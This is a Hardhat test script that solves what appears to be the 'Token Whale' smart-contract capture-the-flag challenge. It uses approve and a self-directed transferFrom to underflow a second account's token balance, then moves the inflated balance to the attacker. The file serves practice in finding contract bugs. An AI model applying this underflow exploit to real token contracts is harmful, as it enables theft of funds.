import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('TokenWhaleChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenWhaleChallenge', deployer)
    ).deploy(attacker.address);

    await target.deployed();

    target = target.connect(attacker);
  });
  it('exploit', async () => {  
    await target.connect(attacker).approve(deployer.address, 1000);  

    await target.connect(deployer).transferFrom(attacker.address, attacker.address, 1000);  
  
 
    const deployerBalance = await target.balanceOf(deployer.address);  
    await target.connect(deployer).transfer(attacker.address, deployerBalance);  

    expect(await target.isComplete()).to.equal(true);  
  });  
});
